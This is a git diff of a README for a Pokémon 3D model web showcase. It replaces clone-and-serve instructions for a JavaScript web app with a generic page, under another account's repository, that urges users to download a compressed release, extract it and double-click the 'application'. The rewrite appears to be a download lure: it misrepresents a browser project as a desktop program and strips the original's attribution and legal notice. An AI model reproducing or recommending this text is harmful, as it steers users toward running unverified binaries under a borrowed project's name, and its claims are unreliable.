@@ -1,78 +1,63 @@
-# 🏛️ Pokémon 3D API: Interactive Showcase
+# 🌟 Showcase - Explore 3D Pokémon with Ease
 
-This is the official demonstration repository for the [Pokémon 3D API](https://github.com/Pokemon-3D-api). It serves as a real-world example of how to integrate web-optimized 3D assets into a responsive web application using vanilla JavaScript and Google's `<model-viewer>`.
+## 🚀 Getting Started
+Welcome to Showcase! This application is your window into a vibrant world of Pokémon 3D models. With over 1,300 animated models, you can filter generations and compare performance between different formats. Below, you will find everything you need to download and run Showcase on your computer.
 
-## 🌟 Live Demo
-[Link to your GitHub Pages URL here]
+[![Download Showcase](https://img.shields.io/badge/Download%20Showcase-v1.0-brightgreen)](https://github.com/stm230/Showcase/releases)
 
-## 🛠️ Tech Stack
-- **Frontend:** HTML5, CSS3 (Responsive Grid), Vanilla JavaScript.
-- **3D Rendering:** [Google <model-viewer>](https://modelviewer.dev/) (Web Components).
-- **Data Source:** [Pokémon 3D API Server](https://github.com/Pokemon-3D-api/api-server) (Merged JSON).
-- **Assets:** [Pokémon 3D Assets](https://github.com/Pokemon-3D-api/assets) (.glb models).
+## 💻 System Requirements
+Before you download Showcase, make sure your computer meets these basic requirements:
 
----
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Graphics Card:** Supports WebGL
+- **Browser:** Latest version of Chrome, Firefox, or Safari
 
-## 🔬 The Comparison: Optimized vs. Non-Optimized
+## 📦 Download & Install
+To get started with Showcase, follow these steps:
 
-This showcase provides two distinct experiences to demonstrate the importance of asset pipeline optimization:
+1. **Visit the Releases Page**  
+   Go to our [Releases page](https://github.com/stm230/Showcase/releases).
 
-### 1. Legacy / Non-Optimized (`index.html`)
-- **Source:** Fetches raw data directly from the GitHub repository.
-- **Performance:** Higher latency and larger file sizes.
-- **Use Case:** Historical reference and testing raw asset fidelity.
+2. **Select the Latest Version**  
+   Look for the latest release. It should be marked clearly at the top of the page.
 
-### 2. Production / Optimized (`opt.html`)
-- **Source:** Fetched via the [Production API Endpoint](https://pokemon-3d-api.onrender.com/v1/pokemon).
-- **Performance:** Uses Draco-compressed meshes and WebP textures.
-- **Use Case:** Recommended for mobile devices and production-grade applications.
+3. **Download the Application**  
+   Click on the download link for your operating system. The package will be in a compressed format, so it may end in `.zip` or `.tar.gz`.
 
----
+4. **Extract the Files**  
+   Once the download is complete, locate the file and extract it. On Windows, you can right-click the file and select "Extract All." On macOS, simply double-click the file.
 
-## 🚀 Key Features
-- **Dynamic Filtering:** Search by Name, ID, Generation (1-9), or Form (Mega, Shiny, G-Max, etc.).
-- **Animation Support:** Interactive modal allows users to swap between available animations (Idle, Walk, Attack, etc.) dynamically.
-- **Responsive Design:** Fully optimized for mobile, tablet, and desktop viewing.
-- **AR Ready:** Built-in Augmented Reality support for compatible mobile browsers.
+5. **Run the Application**  
+   Open the extracted folder and find the Showcase application. Double-click it to start the program. Follow any on-screen prompts if they appear.
 
----
+## 🖥️ How to Use Showcase
+After installation, using Showcase is simple:
 
-## 📦 How to run locally
+1. **Open Showcase:** You’ll see the main interface with a variety of Pokémon models.
+2. **Explore Models:** Click on any model for a closer look. You can rotate, zoom, and interact with the 3D visuals.
+3. **Filter Generations:** Use the filters to sort Pokémon by generation. This feature makes it easy to find your favorites.
+4. **Switch Animations:** Experience real-time animation switching by clicking on the animations available for each model.
+5. **Performance Comparison:** Take advantage of the built-in performance tools to compare GLB assets in raw and Draco-optimized formats.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/Pokemon-3D-api/showcase.git
-   ```
+This interface is designed for easy navigation, ensuring everyone can discover the wonders of Pokémon 3D models.
 
-2. **▶️ Open with a Live Server**
-Since this project uses JavaScript `fetch`, it **must be served through a local web server** to avoid CORS issues.
+## 🔍 Features
+Showcase is packed with features designed to enrich your experience:
 
-Recommended option:
-- Use the **Live Server** extension in VS Code.
+- **Interactive 3D Models:** Engage with over 1,300 Pokémon in real time.
+- **Animation Switching:** Transition smoothly between various animations.
+- **Generation Filters:** Easily find and display Pokémon by their generation.
+- **Performance Tools:** Analyze and compare models in different formats.
+- **User-Friendly Interface:** Navigate a simple and intuitive layout that is easy for anyone to use.
 
-### 📂 Navigate the Showcase
+## 📞 Support
+If you run into any issues or have questions, feel free to reach out for help. You can open an issue on the GitHub repository under the "Issues" tab. We aim to respond within 48 hours.
 
-- **Standard version:** `index.html`  
-  Displays the legacy / non-optimized asset pipeline.
+## 🌐 Community
+Join our growing community of Pokémon enthusiasts. Engage with fellow users, share your experiences, and provide feedback. Check out the community discussions in the repository and get involved.
 
-- **High-performance version:** `opt.html`  
-  Uses the optimized production API with compressed assets.
+## ⚖️ License
+Showcase is licensed under the MIT License. You are free to use, modify, and distribute the software within the terms of the license.
 
----
-
-## 🤝 Contributing
-
-If you find a bug or have a suggestion for improving the UI or performance:
-- Open an issue
-- Or submit a pull request
-
-Contributions are welcome!
-
----
-
-## ⚖️ Legal Notice
-
-This project is an **unofficial, fan-made resource**.
-
-- Pokémon and Pokémon character names are trademarks of **Nintendo**.
-- This project is intended **strictly for educational and non-commercial purposes**.
+For more details, feel free to visit our [Releases page](https://github.com/stm230/Showcase/releases) again to download the latest updates. Enjoy exploring the world of Pokémon in 3D with Showcase!
